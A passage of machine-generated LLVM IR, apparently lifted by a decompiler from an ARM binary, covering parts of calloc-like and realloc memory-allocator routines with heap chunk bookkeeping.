  %v12_14754 = load i32, i32* @lr, align 4
  %v2_1475c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1476c = mul i32 %arg2, %arg1
  store i32 %v2_1476c, i32* @r6, align 4
  br i1 %v2_1475c, label %dec_label_pc_147a4, label %dec_label_pc_14774

dec_label_pc_14774:                               ; preds = %entry
  %v2_1477c = udiv i32 %v2_1476c, %arg1
  %v9_14780 = icmp eq i32 %v2_1477c, %arg2
  br i1 %v9_14780, label %dec_label_pc_147a4, label %dec_label_pc_14788

dec_label_pc_14788:                               ; preds = %dec_label_pc_14774
  %v0_1478c = call i32 @__aeabi_read_tp()
  %v3_14790 = load i16, i16* @global_var_24150.533, align 2
  %v4_14790 = sext i16 %v3_14790 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1479c = add i32 %v4_14790, %v0_1478c
  %v4_1479c = inttoptr i32 %v3_1479c to i32*
  store i32 12, i32* %v4_1479c, align 4
  br label %dec_label_pc_14868

dec_label_pc_147a4:                               ; preds = %dec_label_pc_14774, %entry
  %v4_147a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 108) to i32*), align 4
  store i32 %v4_147a8, i32* @r4, align 4
  %v4_147c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  store i32 %v4_147c0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_147c0)
  %v0_147d4 = load i32, i32* @r5, align 4
  %v2_147d4 = add i32 %v0_147d4, 16
  %v3_147d4 = inttoptr i32 %v2_147d4 to i32*
  %v4_147d4 = load i32, i32* %v3_147d4, align 4
  store i32 %v4_147d4, i32* %ip.global-to-local, align 4
  store i32 83936, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_147d4)
  %v0_147e0 = load i32, i32* @r6, align 4
  store i32 %v0_147e0, i32* @r0, align 4
  %v0_147e4 = call i32 @malloc()
  store i32 %v0_147e4, i32* %r4.global-to-local, align 4
  %v2_147e8 = icmp eq i32 %v0_147e4, 0
  br i1 %v2_147e8, label %.thread, label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147a4
  %v1_147f0 = add i32 %v0_147e4, -4
  %v2_147f0 = inttoptr i32 %v1_147f0 to i32*
  %v3_147f0 = load i32, i32* %v2_147f0, align 4
  %v1_147f4 = and i32 %v3_147f0, 2
  %v2_147f4 = icmp eq i32 %v1_147f4, 0
  br i1 %v2_147f4, label %dec_label_pc_147fc, label %.thread

dec_label_pc_147fc:                               ; preds = %dec_label_pc_147f0
  %v1_147fc6 = add i32 %v3_147f0, -4
  %v1_14800 = and i32 %v1_147fc6, -4
  %v3_14804 = udiv i32 %v1_14800, 4
  store i32 %v3_14804, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_14800, 36
  %v2_1480c = icmp ult i32 %v1_14800, 33
  %v3_1480c = or i1 %tmp, %v2_1480c
  br i1 %v3_1480c, label %dec_label_pc_14818, label %dec_label_pc_14810

dec_label_pc_14810:                               ; preds = %dec_label_pc_147fc
  %v3_14810 = inttoptr i32 %v0_147e4 to i8*
  %v4_14810 = call i32 @__GI_memset(i8* %v3_14810, i32 0, i32 %v1_14800)
  br label %.thread

dec_label_pc_14818:                               ; preds = %dec_label_pc_147fc
  %tmp7 = icmp eq i32 %v1_14800, 16
  %v2_1481c = inttoptr i32 %v0_147e4 to i32*
  store i32 0, i32* %v2_1481c, align 4
  %v1_14820 = load i32, i32* %r4.global-to-local, align 4
  %v2_14820 = add i32 %v1_14820, 4
  %v3_14820 = inttoptr i32 %v2_14820 to i32*
  store i32 0, i32* %v3_14820, align 4
  %v1_14824 = load i32, i32* %r4.global-to-local, align 4
  %v2_14824 = add i32 %v1_14824, 8
  %v3_14824 = inttoptr i32 %v2_14824 to i32*
  store i32 0, i32* %v3_14824, align 4
  %v2_14828 = icmp ult i32 %v1_14800, 13
  %v3_14828 = or i1 %tmp7, %v2_14828
  br i1 %v3_14828, label %.thread, label %dec_label_pc_1482c

dec_label_pc_1482c:                               ; preds = %dec_label_pc_14818
  %v0_1482c = load i32, i32* %ip.global-to-local, align 4
  %v1_14830 = load i32, i32* %r4.global-to-local, align 4
  %v2_14830 = add i32 %v1_14830, 12
  %v3_14830 = inttoptr i32 %v2_14830 to i32*
  store i32 0, i32* %v3_14830, align 4
  %v1_14834 = load i32, i32* %r4.global-to-local, align 4
  %v2_14834 = add i32 %v1_14834, 16
  %v3_14834 = inttoptr i32 %v2_14834 to i32*
  store i32 0, i32* %v3_14834, align 4
  %tmp8 = icmp ult i32 %v0_1482c, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1483c

dec_label_pc_1483c:                               ; preds = %dec_label_pc_1482c
  %v0_1483c = load i32, i32* %ip.global-to-local, align 4
  %v7_1483c = icmp eq i32 %v0_1483c, 9
  %v1_14840 = load i32, i32* %r4.global-to-local, align 4
  %v2_14840 = add i32 %v1_14840, 20
  %v3_14840 = inttoptr i32 %v2_14840 to i32*
  store i32 0, i32* %v3_14840, align 4
  %v1_14844 = load i32, i32* %r4.global-to-local, align 4
  %v2_14844 = add i32 %v1_14844, 24
  %v3_14844 = inttoptr i32 %v2_14844 to i32*
  store i32 0, i32* %v3_14844, align 4
  br i1 %v7_1483c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1483c
  %v2_14848 = load i32, i32* %r4.global-to-local, align 4
  %v3_14848 = add i32 %v2_14848, 32
  %v4_14848 = inttoptr i32 %v3_14848 to i32*
  store i32 0, i32* %v4_14848, align 4
  %v2_1484c = load i32, i32* %r4.global-to-local, align 4
  %v3_1484c = add i32 %v2_1484c, 28
  %v4_1484c = inttoptr i32 %v3_1484c to i32*
  store i32 0, i32* %v4_1484c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1483c, %dec_label_pc_147f0, %dec_label_pc_1482c, %dec_label_pc_14818, %dec_label_pc_147a4, %dec_label_pc_14810, %bb
  %v0_1485c = load i32, i32* @r5, align 4
  %v2_1485c = add i32 %v0_1485c, 44
  %v3_1485c = inttoptr i32 %v2_1485c to i32*
  %v4_1485c = load i32, i32* %v3_1485c, align 4
  store i32 %v4_1485c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1485c)
  br label %dec_label_pc_14868

dec_label_pc_14868:                               ; preds = %dec_label_pc_14788, %.thread
  %v0_14868 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_14754, i32* @r4, align 4
  store i32 %v6_14754, i32* @r5, align 4
  store i32 %v9_14754, i32* @r6, align 4
  store i32 %v12_14754, i32* @lr, align 4
  ret i32 %v0_14868

; uselistorder directives
  uselistorder i32 %v1_14800, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_147e4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 2, 9, 11, 1, 10, 3, 4, 5, 6, 12, 7, 13, 8, 14 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14868, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_14880(i32 %arg1) local_unnamed_addr {
dec_label_pc_14880:
  %v0_14880 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14880, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14880
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14880, %bb
  %v4_14890 = phi i32 [ %arg1, %dec_label_pc_14880 ], [ 0, %bb ]
  ret i32 %v4_14890

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14894 = load i32, i32* @r4, align 4
  %v6_14894 = load i32, i32* @r5, align 4
  %v9_14894 = load i32, i32* @r6, align 4
  %v12_14894 = load i32, i32* @r7, align 4
  %v15_14894 = load i32, i32* @r8, align 4
  %v18_14894 = load i32, i32* @sb, align 4
  %v21_14894 = load i32, i32* @sl, align 4
  %v24_14894 = load i32, i32* @fp, align 4
  %v27_14894 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_148a0 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_148a0, label %dec_label_pc_148b4, label %dec_label_pc_148c4

dec_label_pc_148b4:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_148b8 = call i32 @malloc()
  store i32 %v0_148b8, i32* %r0.global-to-local, align 4
  store i32 %v0_148b8, i32* @r4, align 4
  br label %dec_label_pc_14c24

dec_label_pc_148c4:                               ; preds = %entry
  %v2_148c4 = icmp eq i32 %arg2, 0
  br i1 %v2_148c4, label %dec_label_pc_148cc, label %dec_label_pc_148d8

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148c4
  %v0_148cc = call i32 @free()
  store i32 %v0_148cc, i32* %r0.global-to-local, align 4
  %v0_148d0 = load i32, i32* @r6, align 4
  store i32 %v0_148d0, i32* @r4, align 4
  br label %dec_label_pc_14c24

dec_label_pc_148d8:                               ; preds = %dec_label_pc_148c4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_148e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 108) to i32*), align 4
  store i32 %v4_148e0, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_148e0, i32* %r2.global-to-local, align 4
  %v4_148ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 68) to i32*), align 4
  store i32 %v4_148ec, i32* %r1.global-to-local, align 4
  %v2_148f0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_148f0, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_148f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_148f8)
  %v0_14904 = load i32, i32* @r4, align 4
  store i32 %v0_14904, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_14910 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_1491c.647 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14910)
  %v0_1491c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1491c, -32
  br i1 %tmp36, label %dec_label_pc_14940, label %dec_label_pc_14924

dec_label_pc_14924:                               ; preds = %dec_label_pc_148d8
  store i32 ptrtoint (i32* @global_var_f81c.649 to i32), i32* %r2.global-to-local, align 4
  %v0_14928 = call i32 @__aeabi_read_tp()
  store i32 %v0_14928, i32* %r0.global-to-local, align 4
  %v3_1492c = load i16, i16* @global_var_24150.533, align 2
  %v4_1492c = sext i16 %v3_1492c to i32
  store i32 %v4_1492c, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_14938 = add i32 %v4_1492c, %v0_14928
  %v4_14938 = inttoptr i32 %v3_14938 to i32*
  store i32 12, i32* %v4_14938, align 4
  br label %dec_label_pc_14c24

dec_label_pc_14940:                               ; preds = %dec_label_pc_148d8
  %v1_14940 = add i32 %v0_1491c, 11
  store i32 %v1_14940, i32* %r0.global-to-local, align 4
  %v0_14944 = load i32, i32* @r5, align 4
  %v1_14944 = add i32 %v0_14944, -4
  %v2_14944 = inttoptr i32 %v1_14944 to i32*
  %v3_14944 = load i32, i32* %v2_14944, align 4
  store i32 %v3_14944, i32* %r2.global-to-local, align 4
  %v2_14948 = icmp ugt i32 %v1_14940, 14
  %v7_14948 = icmp eq i32 %v1_14940, 15
  %v2_1494c = xor i1 %v2_14948, true
  %v3_1494c = or i1 %v7_14948, %v2_1494c
  br i1 %v3_1494c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_14940
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_14940, %bb
  %v2_14950 = xor i1 %v7_14948, true
  %v3_14950 = and i1 %v2_14948, %v2_14950
  br i1 %v3_14950, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_14950 = and i32 %v1_14940, -8
  store i32 %v5_14950, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_14954 = and i32 %v3_14944, 2
  %v2_14954 = icmp eq i32 %v1_14954, 0
  %v1_14958 = add i32 %v0_14944, -8
  store i32 %v1_14958, i32* @sl, align 4
  %v1_1495c = and i32 %v3_14944, -4
  store i32 %v1_1495c, i32* @r6, align 4
  br i1 %v2_14954, label %dec_label_pc_14964, label %dec_label_pc_14b3c

dec_label_pc_14964:                               ; preds = %bb29
  %v1_14964 = load i32, i32* @sb, align 4
  %v3_14964 = icmp ult i32 %v1_1495c, %v1_14964
  br i1 %v3_14964, label %dec_label_pc_14970, label %bb30

bb30:                                             ; preds = %dec_label_pc_14964
  store i32 %v1_1495c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ad4

dec_label_pc_14970:                               ; preds = %dec_label_pc_14964
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14978 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_14978, i32* %r0.global-to-local, align 4
  %v1_1497c = add i32 %v4_14978, 44
  %v2_1497c = inttoptr i32 %v1_1497c to i32*
  %v3_1497c = load i32, i32* %v2_1497c, align 4
  store i32 %v3_1497c, i32* %r3.global-to-local, align 4
  %v2_14980 = add i32 %v1_1495c, %v1_14958
  store i32 %v2_14980, i32* @r4, align 4
  %v9_14984 = icmp eq i32 %v2_14980, %v3_1497c
  %v1_14988 = add i32 %v2_14980, 4
  %v2_14988 = inttoptr i32 %v1_14988 to i32*
  %v3_14988 = load i32, i32* %v2_14988, align 4
  store i32 %v3_14988, i32* %r1.global-to-local, align 4
  br i1 %v9_14984, label %dec_label_pc_14990, label %dec_label_pc_149cc

dec_label_pc_14990:                               ; preds = %dec_label_pc_14970
  %v1_14990 = and i32 %v3_14988, -4
  %v2_14994 = add i32 %v1_14990, %v1_1495c
  store i32 %v2_14994, i32* %r1.global-to-local, align 4
  %v1_14998 = add i32 %v1_14964, 16
  store i32 %v1_14998, i32* %r3.global-to-local, align 4
  %v3_1499c = icmp ult i32 %v2_14994, %v1_14998
  br i1 %v3_1499c, label %dec_label_pc_14a20, label %dec_label_pc_149a4

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14990
  %v2_149a4 = sub i32 %v2_14994, %v1_14964
  %v1_149a8 = urem i32 %v3_14944, 2
  %v2_149ac = add i32 %v1_14964, %v1_14958
  store i32 %v2_149ac, i32* %r1.global-to-local, align 4
  %v2_149b0 = or i32 %v1_14964, %v1_149a8
  store i32 %v2_149b0, i32* %r2.global-to-local, align 4
  %v1_149b4 = or i32 %v2_149a4, 1
  store i32 %v1_149b4, i32* %r3.global-to-local, align 4
  store i32 %v0_14944, i32* @r4, align 4
  store i32 %v2_149b0, i32* %v2_14944, align 4
  %v0_149c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_149c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_149c0 = add i32 %v1_149c0, 44
  %v3_149c0 = inttoptr i32 %v2_149c0 to i32*
  store i32 %v0_149c0, i32* %v3_149c0, align 4
  %v0_149c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_149c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_149c4 = add i32 %v1_149c4, 4
  %v3_149c4 = inttoptr i32 %v2_149c4 to i32*
  store i32 %v0_149c4, i32* %v3_149c4, align 4
  br label %dec_label_pc_14c08

dec_label_pc_149cc:                               ; preds = %dec_label_pc_14970
  %v1_149cc = and i32 %v3_14988, -2
  %v2_149d0 = add i32 %v1_149cc, %v2_14980
  store i32 %v2_149d0, i32* %r3.global-to-local, align 4
  %v1_149d4 = add i32 %v2_149d0, 4
  %v2_149d4 = inttoptr i32 %v1_149d4 to i32*
  %v3_149d4 = load i32, i32* %v2_149d4, align 4
  store i32 %v3_149d4, i32* %r3.global-to-local, align 4
  %v1_149d8 = urem i32 %v3_149d4, 2
  %v2_149d8 = icmp eq i32 %v1_149d8, 0
  br i1 %v2_149d8, label %dec_label_pc_149e0, label %dec_label_pc_14a20

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149cc
  %v1_149e0 = and i32 %v3_14988, -4
  store i32 %v1_149e0, i32* %r3.global-to-local, align 4
  %v2_149e4 = add i32 %v1_149e0, %v1_1495c
  store i32 %v2_149e4, i32* %r0.global-to-local, align 4
  %v3_149e8 = icmp ult i32 %v2_149e4, %v1_14964
  br i1 %v3_149e8, label %dec_label_pc_14a20, label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149e0
  %v1_149f0 = add i32 %v1_1495c, %v0_14944
  %v2_149f0 = inttoptr i32 %v1_149f0 to i32*
  %v3_149f0 = load i32, i32* %v2_149f0, align 4
  store i32 %v3_149f0, i32* %r1.global-to-local, align 4
  %v1_149f4 = add i32 %v3_149f0, 12
  %v2_149f4 = inttoptr i32 %v1_149f4 to i32*
  %v3_149f4 = load i32, i32* %v2_149f4, align 4
  store i32 %v3_149f4, i32* %r3.global-to-local, align 4
  %v9_149f8 = icmp eq i32 %v3_149f4, %v2_14980
  %v1_149fc = add i32 %v2_14980, 12
  %v2_149fc = inttoptr i32 %v1_149fc to i32*
  %v3_149fc = load i32, i32* %v2_149fc, align 4
  store i32 %v3_149fc, i32* %r2.global-to-local, align 4
  br i1 %v9_149f8, label %dec_label_pc_14a04, label %dec_label_pc_14a10

dec_label_pc_14a04:                               ; preds = %dec_label_pc_149f0
  %v1_14a04 = add i32 %v3_149fc, 8
  %v2_14a04 = inttoptr i32 %v1_14a04 to i32*
  %v3_14a04 = load i32, i32* %v2_14a04, align 4
  store i32 %v3_14a04, i32* %r3.global-to-local, align 4
  %v9_14a08 = icmp eq i32 %v3_14a04, %v2_14980
  br i1 %v9_14a08, label %dec_label_pc_14a14, label %dec_label_pc_14a10

dec_label_pc_14a10:                               ; preds = %dec_label_pc_149f0, %dec_label_pc_14a04
  %v0_14a10 = call i32 @abort()
  store i32 %v0_14a10, i32* %r0.global-to-local, align 4
  %v0_14a14.pre = load i32, i32* @r1, align 4
  %v1_14a14.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14a14

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14a04, %dec_label_pc_14a10
  %v1_14a14 = phi i32 [ %v3_149fc, %dec_label_pc_14a04 ], [ %v1_14a14.pre, %dec_label_pc_14a10 ]
  %v0_14a14 = phi i32 [ %v3_149f0, %dec_label_pc_14a04 ], [ %v0_14a14.pre, %dec_label_pc_14a10 ]
  %v2_14a14 = add i32 %v1_14a14, 8
  %v3_14a14 = inttoptr i32 %v2_14a14 to i32*
  store i32 %v0_14a14, i32* %v3_14a14, align 4
  %v0_14a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a18 = load i32, i32* %r1.global-to-local, align 4
  %v2_14a18 = add i32 %v1_14a18, 12
  %v3_14a18 = inttoptr i32 %v2_14a18 to i32*
  store i32 %v0_14a18, i32* %v3_14a18, align 4
  %v1_14ad4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ad4

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14990, %dec_label_pc_149e0, %dec_label_pc_149cc
  %v1_14a20 = add i32 %v1_14964, -7
  store i32 %v1_14a20, i32* @r0, align 4
  %v0_14a24 = call i32 @malloc()
  store i32 %v0_14a24, i32* @r0, align 4
  store i32 %v0_14a24, i32* %r1.global-to-local, align 4
  %v2_14a28 = icmp eq i32 %v0_14a24, 0
  br i1 %v2_14a28, label %bb31, label %dec_label_pc_14a34

bb31:                                             ; preds = %dec_label_pc_14a20
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a20
  %v1_14a3c.pre = load i32, i32* @r4, align 4
  %v1_14a34 = add i32 %v0_14a24, -4
  %v2_14a34 = inttoptr i32 %v1_14a34 to i32*
  %v3_14a34 = load i32, i32* %v2_14a34, align 4
  store i32 %v3_14a34, i32* @r3, align 4
  %v1_14a38 = add i32 %v0_14a24, -8
  store i32 %v1_14a38, i32* @r7, align 4
  %v9_14a3c = icmp eq i32 %v1_14a38, %v1_14a3c.pre
  br i1 %v9_14a3c, label %.thread2, label %dec_label_pc_14a4c

.thread2:                                         ; preds = %dec_label_pc_14a34
  %v2_14a40 = and i32 %v3_14a34, -4
  store i32 %v2_14a40, i32* %r3.global-to-local, align 4
  %v2_14a44 = load i32, i32* @r6, align 4
  %v3_14a44 = add i32 %v2_14a44, %v2_14a40
  store i32 %v3_14a44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ad4

dec_label_pc_14a4c:                               ; preds = %dec_label_pc_14a34
  %v0_14a4c = load i32, i32* @r6, align 4
  %v1_14a4c = add i32 %v0_14a4c, -4
  store i32 %v1_14a4c, i32* @r2, align 4
  %v3_14a50 = udiv i32 %v1_14a4c, 4
  store i32 %v3_14a50, i32* @ip, align 4
  %tmp37 = and i32 %v1_14a4c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_14a58 = icmp ult i32 %v1_14a4c, 36
  %v3_14a58 = or i1 %tmp38, %v2_14a58
  %v0_14a68 = load i32, i32* @r5, align 4
  br i1 %v3_14a58, label %dec_label_pc_14a68, label %dec_label_pc_14a5c

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a4c
  store i32 %v0_14a68, i32* @r1, align 4
  %v0_14a60 = call i32 @memcpy()
  store i32 %v0_14a60, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a4c
  %v1_14a68 = inttoptr i32 %v0_14a68 to i32*
  %v2_14a68 = load i32, i32* %v1_14a68, align 4
  store i32 %v2_14a68, i32* %r3.global-to-local, align 4
  %v2_14a6c = inttoptr i32 %v0_14a24 to i32*
  store i32 %v2_14a68, i32* %v2_14a6c, align 4
  %v0_14a70 = load i32, i32* @r5, align 4
  %v1_14a70 = add i32 %v0_14a70, 4
  %v2_14a70 = inttoptr i32 %v1_14a70 to i32*
  %v3_14a70 = load i32, i32* %v2_14a70, align 4
  store i32 %v3_14a70, i32* %r3.global-to-local, align 4
  %v1_14a74 = load i32, i32* %r1.global-to-local, align 4
  %v2_14a74 = add i32 %v1_14a74, 4
  %v3_14a74 = inttoptr i32 %v2_14a74 to i32*
  store i32 %v3_14a70, i32* %v3_14a74, align 4
  %v0_14a78 = load i32, i32* @r5, align 4
  %v1_14a78 = add i32 %v0_14a78, 8
  %v2_14a78 = inttoptr i32 %v1_14a78 to i32*
  %v3_14a78 = load i32, i32* %v2_14a78, align 4
  store i32 %v3_14a78, i32* %r3.global-to-local, align 4
  %v0_14a7c = load i32, i32* @ip, align 4
  %v1_14a80 = load i32, i32* %r1.global-to-local, align 4
  %v2_14a80 = add i32 %v1_14a80, 8
  %v3_14a80 = inttoptr i32 %v2_14a80 to i32*
  store i32 %v3_14a78, i32* %v3_14a80, align 4
  %tmp39 = icmp ult i32 %v0_14a7c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a68
  %v0_14a88 = load i32, i32* @r5, align 4
  %v1_14a88 = add i32 %v0_14a88, 12
  %v2_14a88 = inttoptr i32 %v1_14a88 to i32*
  %v3_14a88 = load i32, i32* %v2_14a88, align 4
  store i32 %v3_14a88, i32* %r3.global-to-local, align 4
  %v1_14a8c = load i32, i32* %r1.global-to-local, align 4
  %v2_14a8c = add i32 %v1_14a8c, 12
  %v3_14a8c = inttoptr i32 %v2_14a8c to i32*
  store i32 %v3_14a88, i32* %v3_14a8c, align 4
  %v0_14a90 = load i32, i32* @r5, align 4
  %v1_14a90 = add i32 %v0_14a90, 16
  %v2_14a90 = inttoptr i32 %v1_14a90 to i32*
  %v3_14a90 = load i32, i32* %v2_14a90, align 4
  store i32 %v3_14a90, i32* %r3.global-to-local, align 4
  %v0_14a94 = load i32, i32* @ip, align 4
  %v1_14a98 = load i32, i32* %r1.global-to-local, align 4
  %v2_14a98 = add i32 %v1_14a98, 16
  %v3_14a98 = inttoptr i32 %v2_14a98 to i32*
  store i32 %v3_14a90, i32* %v3_14a98, align 4
  %tmp40 = icmp ult i32 %v0_14a94, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_14aa0

dec_label_pc_14aa0:                               ; preds = %dec_label_pc_14a88
  %v0_14aa0 = load i32, i32* @r5, align 4
  %v1_14aa0 = add i32 %v0_14aa0, 20
  %v2_14aa0 = inttoptr i32 %v1_14aa0 to i32*
  %v3_14aa0 = load i32, i32* %v2_14aa0, align 4
  store i32 %v3_14aa0, i32* %r3.global-to-local, align 4
  %v1_14aa4 = load i32, i32* %r1.global-to-local, align 4
  %v2_14aa4 = add i32 %v1_14aa4, 20
  %v3_14aa4 = inttoptr i32 %v2_14aa4 to i32*
  store i32 %v3_14aa0, i32* %v3_14aa4, align 4
  %v0_14aa8 = load i32, i32* @r5, align 4
  %v1_14aa8 = add i32 %v0_14aa8, 24
  %v2_14aa8 = inttoptr i32 %v1_14aa8 to i32*
  %v3_14aa8 = load i32, i32* %v2_14aa8, align 4
  store i32 %v3_14aa8, i32* %r3.global-to-local, align 4
  %v1_14aac = load i32, i32* %r1.global-to-local, align 4
  %v2_14aac = add i32 %v1_14aac, 24
  %v3_14aac = inttoptr i32 %v2_14aac to i32*
  store i32 %v3_14aa8, i32* %v3_14aac, align 4
  %v0_14ab0 = load i32, i32* @ip, align 4
  %v7_14ab0 = icmp eq i32 %v0_14ab0, 9
  br i1 %v7_14ab0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_14aa0
  %v1_14ab4 = load i32, i32* @r5, align 4
  %v2_14ab4 = add i32 %v1_14ab4, 28
  %v3_14ab4 = inttoptr i32 %v2_14ab4 to i32*
  %v4_14ab4 = load i32, i32* %v3_14ab4, align 4
  store i32 %v4_14ab4, i32* %r3.global-to-local, align 4
  %v2_14ab8 = load i32, i32* %r1.global-to-local, align 4
  %v3_14ab8 = add i32 %v2_14ab8, 28
  %v4_14ab8 = inttoptr i32 %v3_14ab8 to i32*
  store i32 %v4_14ab4, i32* %v4_14ab8, align 4
  %v1_14abc = load i32, i32* @r5, align 4
  %v2_14abc = add i32 %v1_14abc, 32
  %v3_14abc = inttoptr i32 %v2_14abc to i32*
  %v4_14abc = load i32, i32* %v3_14abc, align 4
  store i32 %v4_14abc, i32* %r3.global-to-local, align 4
  %v2_14ac0 = load i32, i32* %r1.global-to-local, align 4
  %v3_14ac0 = add i32 %v2_14ac0, 32
  %v4_14ac0 = inttoptr i32 %v3_14ac0 to i32*
  store i32 %v4_14abc, i32* %v4_14ac0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14aa0, %dec_label_pc_14a88, %dec_label_pc_14a68, %dec_label_pc_14a5c, %bb32
  %v0_14ac4 = load i32, i32* @r5, align 4
  store i32 %v0_14ac4, i32* @r0, align 4
  %v0_14ac8 = call i32 @free()
  store i32 %v0_14ac8, i32* %r0.global-to-local, align 4
  %v0_14acc = load i32, i32* @r7, align 4
  %v1_14acc = add i32 %v0_14acc, 8
  store i32 %v1_14acc, i32* @r4, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14ad4:                               ; preds = %bb30, %.thread2, %dec_label_pc_14a14
  %v0_14ae8 = phi i32 [ %v3_14a44, %.thread2 ], [ %v1_1495c, %bb30 ], [ %v1_14ad4.pre, %dec_label_pc_14a14 ]
  %v0_14ad4 = load i32, i32* @sb, align 4
  %v2_14ad4 = sub i32 %v0_14ae8, %v0_14ad4
  store i32 %v2_14ad4, i32* %r1.global-to-local, align 4
  %v0_14adc = load i32, i32* @sl, align 4
  %v1_14adc = add i32 %v0_14adc, 4
  %v2_14adc = inttoptr i32 %v1_14adc to i32*
  %v3_14adc = load i32, i32* %v2_14adc, align 4
  %tmp41 = icmp ugt i32 %v2_14ad4, 15
  %v1_14b04 = urem i32 %v3_14adc, 2
  store i32 %v1_14b04, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_14b04, label %dec_label_pc_14ae4

dec_label_pc_14ae4:                               ; preds = %dec_label_pc_14ad4
  %v2_14ae8 = or i32 %v1_14b04, %v0_14ae8
  store i32 %v2_14ae8, i32* %r3.global-to-local, align 4
  store i32 %v2_14ae8, i32* %v2_14adc, align 4
